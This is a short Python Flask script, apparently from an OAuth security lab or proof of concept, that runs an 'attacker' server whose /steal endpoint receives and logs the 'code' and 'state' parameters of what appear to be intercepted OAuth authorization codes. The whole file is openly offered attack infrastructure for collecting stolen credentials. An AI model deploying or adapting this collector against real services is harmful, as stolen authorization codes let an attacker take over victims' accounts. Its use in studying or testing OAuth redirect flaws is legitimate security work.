from flask import Flask, request

app = Flask(__name__)


@app.route('/steal')
def steal():
    code = request.args.get('code')
    state = request.args.get('state')
    print(f"[attacker] code={code} state={state}", flush=True)
    return f"stolen: {code}"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8085)
